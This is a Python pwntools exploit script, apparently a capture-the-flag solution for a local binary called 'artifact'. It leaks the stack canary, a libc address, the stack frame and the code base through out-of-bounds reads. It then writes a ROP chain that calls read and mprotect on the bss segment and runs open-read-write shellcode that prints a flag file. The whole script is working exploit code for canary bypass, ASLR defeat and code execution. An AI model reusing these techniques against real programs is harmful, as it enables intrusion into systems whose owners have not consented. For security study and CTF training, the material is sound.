from pwn import *

context.arch = 'amd64'

def show(ind):
	p.sendline('1')
	p.sendline(str(ind))
	
def memo(ind, num):
	p.sendline('2')
	p.sendline(str(ind))
	p.sendline(str(num))
	
def Exit():
	p.sendline('3')
	
if __name__ == "__main__":
	p = process('./artifact', env = {"LD_PRELOAD" : "./libc.so.6"})
	elf = ELF('artifact')
	libc = ELF('libc.so.6')
	
	
	gdb.attach(p)
	
	p.recvuntil('Choice?\n')
	show(201)
	p.recvuntil('Here it is: ')
	canary = int(p.recvline()[:-1])
	info("canary: %s"%hex(canary))
	
	p.recvuntil('Choice?\n')
	show(203)
	p.recvuntil('Here it is: ')
	leak = int(p.recvline()[:-1])
	info("leak: %s"%hex(leak))
	
	libc_base = leak - 0x203f1
	info("libc: %s"%hex(libc_base))
	
	# gadgets:
	pop_rdi = libc_base + 0x000000000001fd7a
	pop_rsi = libc_base + 0x000000000001fcbd
	pop_rdx = libc_base + 0x0000000000001b92
	pop_rax = libc_base + 0x000000000003a998
	pop_rcx = libc_base + 0x00000000001a97b8
	
	mov_qword_rdi_rcx = libc_base + 0x000000000009192f
	mov_qword_rsi_rdi = libc_base + 0x000000000007fa2b
	
	syscall = libc_base + 0x00000000000026c7
	ret = libc_base + 0x0000000000000937
	mprotect = libc_base + libc.symbols['mprotect']
	read = libc_base + libc.symbols['read']
	
	info("mprotect: %s"%hex(mprotect))
	info("read: %s"%hex(read))
	
	p.recvuntil('Choice?\n')
	show(200)
	p.recvuntil('Here it is: ')
	rbp = int(p.recvline()[:-1]) + 0xf0
	info("rbp: %s"%hex(rbp))
	
	p.recvuntil('Choice?\n')
	show(207)
	p.recvuntil('Here it is: ')
	code_base = int(p.recvline()[:-1]) - 0xa6c
	info("code base: %s"%hex(code_base))
	
	bss_addr = code_base + 0x202000
	info("bss: %s"%hex(bss_addr))
	
	for i in range(0, 201):
		memo(i, 0x0)
	memo(201, canary)
	memo(202, 0x0)
	# mprotect --> rbp+0x8 : 203
	
	memo(203, pop_rdi)
	memo(204, 0x0)
	memo(205, pop_rsi)
	memo(206, bss_addr+3000)
	memo(207, pop_rdx)
	memo(208, 0x200)
	memo(209, read)
	
	memo(210, pop_rdi)
	memo(211, bss_addr)
	memo(212, pop_rsi)
	memo(213, 0xe00)
	memo(214, pop_rdx)
	memo(215, 0x6)
	memo(216, mprotect)
	memo(217, bss_addr+3000)
	
	Exit()
	
	# shellcode: orw
	
	shell = asm("""
	mov r8, 0x7d7b67616c66
	push r8
	mov rdi, rsp
	xor rsi, rsi
	mov rdx, 0x2
	mov rax, 0x2
	syscall
	
	mov rdi, 0x3
	mov rsi, rsp
	mov rdx, 0x50
	xor rax, rax
	syscall
	
	mov rdx, 0x50
	mov rdi, 0x1
	mov rsi, rsp
	mov rax, 0x1
	syscall
	""")
	
	p.sendline(shell)
	
	
	p.interactive()
	
